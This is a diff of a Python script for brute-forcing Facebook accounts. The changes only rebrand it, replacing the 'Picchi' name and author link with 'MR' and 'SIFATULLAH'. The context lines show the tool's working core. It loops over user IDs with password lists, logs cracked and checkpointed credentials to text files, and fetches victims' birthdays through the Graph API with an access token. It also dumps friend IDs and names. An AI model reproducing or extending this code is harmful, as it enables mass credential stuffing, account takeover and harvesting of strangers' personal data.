@@ -143,12 +143,12 @@ def main():
     if psy in ('5', '05'):
     	os.system('clear');print(banner);sep()
     if psy in ('6', '06'):
-    	os.system("xdg-open https://www.facebook.com/ps7c8o.p133h1")
+    	os.system("xdg-open https://www.facebook.com/sifatullah.510313")
     if psy in ('7', '07'):
         time.sleep(2)
         os.system('clear');print(banner);print(' Removing Token .');time.sleep(1);os.system('clear');print(banner);print(' Removing Token ..');time.sleep(1);os.system('clear');print(banner);print(' Removing Token ...');time.sleep(2);os.system('clear');print(banner);print('\033[1;91mToken Removed\033[0m');time.sleep(3);os.system('rm -rf access_token.txt'); version()
     if psy in ('0', '00'):
-        exit('THANKS FOR USING MR PICCHI TOOL')  
+        exit('THANKS FOR USING SIFATULLAH TOOL')  
     else:
     	print ('        Invalid Select')
     version()
@@ -204,7 +204,7 @@ class __crack__:
 		self.__pler__()
 	def __mbasic__(self, user, _sempak_):
 		global ok,cp,loop
-		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mPicchi\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Id\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
+		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mMR\033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Id\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
 		sys.stdout.flush()
 		for pw in _sempak_:
 			pw = pw.lower()
@@ -227,7 +227,7 @@ class __crack__:
 				open('ok.txt','a').write('%s\n' % wrt)
 				break
 			elif 'checkpoint' in ses.cookies.get_dict():
-				print('\r\033[1;31m[\033[1;30mPICCHI-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
+				print('\r\033[1;31m[\033[1;30mMR-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
 				wrt = '%s - %s' % (user,pw)
 				ok.append(wrt)
 				open('cp.txt','a').write('%s\n' % wrt)
@@ -387,10 +387,10 @@ class __filecrack3__:
 					token = bayn('token.txt').read()
 					cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
 					month, day, year = cp_ttl.split('/')
-					month = bulan_ttl[month].print('\r\033[1;91m[PICCHI-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
+					month = bulan_ttl[month].print('\r\033[1;91m[MR-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
 					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
 					cp.append(wrt)
-					open('Picchi_Cp.txt','a').write('%s\n' % wrt)
+					open('MR_Cp.txt','a').write('%s\n' % wrt)
 					break
 				except (KeyError, IOError):
 					month = ''
@@ -398,10 +398,10 @@ class __filecrack3__:
 					year  = ''
 				except:
 					pass
-				print('\r\033[1;91m[PICCHI-CP] %s | %s%s      ' % (user,pw,tahun(user)))
+				print('\r\033[1;91m[MR-CP] %s | %s%s      ' % (user,pw,tahun(user)))
 				wrt = '%s - %s%s'%(user,pw,tahun(user))
 				cp.append(wrt)
-				open('Picchi_Cp.txt','a').write('%s\n' % wrt)
+				open('MR_Cp.txt','a').write('%s\n' % wrt)
 				break
 			else:
 				continue
@@ -600,7 +600,7 @@ class __cracking__:
 				open('ok.txt','a').write('%s\n' % wrt)
 				break
 			elif 'checkpoint' in ses.cookies.get_dict():
-				print('\r\033[1;31m[\033[1;30mPICCHI-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
+				print('\r\033[1;31m[\033[1;30mMR-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
 				wrt = '%s - %s' % (user,pw)
 				ok.append(wrt)
 				open('cp.txt','a').write('%s\n' % wrt)
@@ -725,7 +725,7 @@ def create_file():
                 except:
                     last_name = 'Khan'
                 idsave.write(uids+'|'+first_name+' '+last_name+'\n')
-            print('\033[1;97m [\033[1;32mPicchi\033[1;37m] \033[1;36mSUCCESSFULL DUMP FROM\033[1;37m '+ids)
+            print('\033[1;97m [\033[1;32mMR\033[1;37m] \033[1;36mSUCCESSFULL DUMP FROM\033[1;37m '+ids)
             idsave.close()
         except Exception as e:
            
